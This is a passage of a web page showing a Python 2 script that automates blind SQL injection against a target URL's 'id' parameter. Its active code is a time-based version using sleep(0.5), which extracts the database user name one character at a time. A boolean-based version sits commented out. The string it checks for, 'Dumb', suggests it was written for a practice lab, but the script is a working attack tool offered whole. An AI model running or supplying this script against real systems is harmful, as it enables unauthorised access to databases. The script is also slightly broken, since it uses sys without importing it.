an class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">    print &apos;attacking&apos;</span><br><span class="line">    user = &apos;[+]current_user:&apos;</span><br><span class="line">    zimu1 = range(33,65)</span><br><span class="line">    zimu2 = range(91,128)</span><br><span class="line">    zimu = zimu1 +zimu2</span><br><span class="line">    for l in range(1,16):</span><br><span class="line">        for i in zimu:</span><br><span class="line"></span><br><span class="line">            # bool盲注</span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            payload = &quot;and substring(user(),&quot;+str(l)+&quot;,1)=&apos;&quot; + chr(i) + &quot;&apos;&quot;</span><br><span class="line">            payload = &#123;&apos;id&apos;:&apos;1 &apos; + payload&#125;</span><br><span class="line">            r = requests.get(url,params=payload)</span><br><span class="line">            wenben = r.text</span><br><span class="line">            wenben = wenben.encode(&quot;utf-8&quot;)</span><br><span class="line">            result = wenben.find(&quot;Dumb&quot;)</span><br><span class="line">            if (result != -1):</span><br><span class="line">                user = user + chr(i)</span><br><span class="line">                print user</span><br><span class="line">                break</span><br><span class="line">            &apos;&apos;&apos;</span><br><span class="line">            #时间盲注</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            payload = &quot;and if(mid((select user()),&quot; + str(l) + &quot;,1)=&apos;&quot;+chr(i)+&quot;&apos;,sleep(0.5),1)&quot;</span><br><span class="line">            payload = &#123;&apos;id&apos;:&apos;1 &apos;+payload&#125;</span><br><span class="line">            r = requests.get(url,params=payload)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            if (endTime - startTime &gt; 0.5) :</span><br><span class="line">                user = user + chr(i)</span><br><span class="line">                print l</span><br><span class="line">                print user</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv)==1:</span><br><span class="line">        print u&quot;必须目标&quot;</span><br><span class="line">    else:</span><br><span class="line">        attack(sys.argv[1])</span><br><span class="line">        print &apos;[+]ok&apos;</span><br></pre></td></tr></table></figure>
